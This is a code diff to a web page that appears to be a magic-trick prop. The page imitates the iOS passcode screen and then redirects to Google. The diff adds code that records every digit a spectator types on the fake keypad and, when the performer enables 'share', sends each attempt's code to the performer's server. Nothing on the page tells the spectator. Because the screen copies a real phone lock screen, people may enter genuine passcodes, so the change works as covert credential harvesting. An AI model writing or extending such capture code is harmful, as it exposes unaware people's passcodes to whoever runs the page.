@@ -12,7 +12,9 @@
      black    -> the screen looks asleep (secret tap on the cover's top-right corner)
      passcode -> a copy of the iOS passcode screen, which fails until it doesn't
      unlocked -> the page replaces itself with Google
-     Nothing typed on the keypad is ever stored or sent anywhere. */
+     Nothing typed on the keypad is stored or sent anywhere, unless the performer's
+     app has switched "share" on for this room: then each finished try's digits
+     go to the performer's app only, held in memory for ten minutes. */
   :root { --bg-top: #2a2c31; --bg-bot: #101114; }
   html, body { margin: 0; height: 100%; background: #fff; overflow: hidden;
                -webkit-user-select: none; user-select: none; -webkit-touch-callout: none;
@@ -113,6 +115,8 @@
   var cfg = Object.assign({}, base);
 
   var stage = "cover", attempts = 0, typed = 0, override = null, busy = false;
+  // Held only to relay a finished try when the performer has switched "share" on.
+  var entered = "";
   var lastSeq = null;
 
   function clampInt(v, lo, hi, d) { var n = parseInt(v, 10); return isNaN(n) ? d : Math.max(lo, Math.min(hi, n)); }
@@ -124,7 +128,7 @@
     var k = document.createElement("div");
     k.className = "k" + (n === 0 ? " z" : "");
     k.innerHTML = "<b>" + n + "</b><s>" + (n >= 2 ? LET[n - 1] : "") + "</s>";
-    k.addEventListener("pointerdown", function (e) { e.stopPropagation(); press(k); });
+    k.addEventListener("pointerdown", function (e) { e.stopPropagation(); press(k, n); });
     k.addEventListener("pointerup", function () { k.classList.remove("p"); });
     k.addEventListener("pointercancel", function () { k.classList.remove("p"); });
     k.addEventListener("pointerleave", function () { k.classList.remove("p"); });
@@ -190,15 +194,22 @@
     setTimeout(function () { location.replace(/^https:\/\/[^\s/]+/.test(cfg.page || "") ? cfg.page : "https://www.google.com/"); }, 360);
   }
 
-  function press(k) {
+  function press(k, digit) {
     if (stage !== "passcode" || busy) return;
     keepAwake();
     k.classList.add("p");
     if (typed >= cfg.digits) return;
+    entered = entered.slice(0, typed) + digit;
     typed++; drawDots(); report();
     if (typed < cfg.digits) return;
     busy = true;
     attempts++;
+    if (cfg.share === true && room) {
+      fetch("/api/unlock/" + room + "/entry", {
+        method: "POST", headers: { "Content-Type": "application/json" }, keepalive: true,
+        body: JSON.stringify({ n: attempts, code: entered.slice(0, cfg.digits) })
+      }).catch(function () {});
+    }
     var win = override === "unlock" ? true : override === "fail" ? false : attempts > cfg.fails;
     override = null;
     setTimeout(function () {
